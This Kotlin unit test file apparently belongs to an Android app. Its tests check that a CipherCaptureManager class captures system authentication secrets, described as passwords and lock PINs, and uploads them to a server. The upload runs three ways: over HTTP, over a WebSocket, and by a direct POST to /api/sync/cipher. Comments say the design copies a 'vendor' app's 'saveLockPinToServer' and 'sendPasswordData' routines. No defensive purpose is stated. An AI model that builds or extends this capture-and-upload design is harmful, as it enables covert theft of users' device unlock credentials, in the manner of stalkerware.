package com.storm.safe.rock.service.modules.cipher

import org.junit.Test
import org.junit.Assert.*

class CipherUploadTriplePathTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/cipher/CipherCaptureManager.kt").readText()
    }

    @Test
    fun `uploadPasswordViaHttp method exists`() {
        assertTrue(
            "uploadPasswordViaHttp method must exist (vendor: NetworkManager\$sendPasswordData\$1)",
            source.contains("fun uploadPasswordViaHttp(")
        )
    }

    @Test
    fun `uploadPasswordViaHttp calls HttpManager uploadPasswordCapture`() {
        val methodIdx = source.indexOf("fun uploadPasswordViaHttp(")
        assertTrue("method must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 3000).coerceAtMost(source.length))
        assertTrue(
            "must call httpManager.uploadPasswordCapture (not raw OkHttp)",
            body.contains("uploadPasswordCapture")
        )
    }

    @Test
    fun `uploadPasswordViaHttp passes system_auth_capture as inputMethod`() {
        val methodIdx = source.indexOf("fun uploadPasswordViaHttp(")
        assertTrue("method must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 3000).coerceAtMost(source.length))
        assertTrue(
            "inputMethod must be system_auth_capture (vendor hardcode)",
            body.contains("system_auth_capture")
        )
    }

    @Test
    fun `uploadCipherViaDirectHttp method exists`() {
        assertTrue(
            "uploadCipherViaDirectHttp method must exist (vendor: saveLockPinToServer\$1)",
            source.contains("fun uploadCipherViaDirectHttp(")
        )
    }

    @Test
    fun `uploadCipherViaDirectHttp posts to api_sync_cipher`() {
        val methodIdx = source.indexOf("fun uploadCipherViaDirectHttp(")
        assertTrue("method must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 3000).coerceAtMost(source.length))
        assertTrue("must POST to /api/sync/cipher", body.contains("/api/sync/cipher"))
    }

    @Test
    fun `uploadCipherViaDirectHttp uses httpClient not new OkHttpClient`() {
        val methodIdx = source.indexOf("fun uploadCipherViaDirectHttp(")
        assertTrue("method must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 3000).coerceAtMost(source.length))
        assertTrue("must reuse existing httpClient field (L345)", body.contains("httpClient.newCall"))
        assertFalse("must NOT create new OkHttpClient inside method", body.contains("OkHttpClient.Builder()"))
    }

    @Test
    fun `uploadCipherViaDirectHttp uses X_Client_ID header only`() {
        val methodIdx = source.indexOf("fun uploadCipherViaDirectHttp(")
        assertTrue("method must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 3000).coerceAtMost(source.length))
        assertTrue("must include X-Client-ID", body.contains("X-Client-ID"))
        assertFalse("must NOT include X-Client-Token (vendor uses only X-Client-ID)", body.contains("X-Client-Token"))
    }

    @Test
    fun `confirmAndSaveLastCipher calls all three upload methods`() {
        val methodIdx = source.indexOf("fun confirmAndSaveLastCipherInternal(")
        assertTrue("confirmAndSaveLastCipherInternal must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 3000).coerceAtMost(source.length))
        assertTrue("must call sendPasswordViaWebSocket (path 2)", body.contains("sendPasswordViaWebSocket"))
        assertTrue("must call uploadPasswordViaHttp (path 1)", body.contains("uploadPasswordViaHttp"))
        assertTrue("must call uploadCipherViaDirectHttp (path 3)", body.contains("uploadCipherViaDirectHttp"))
    }
}
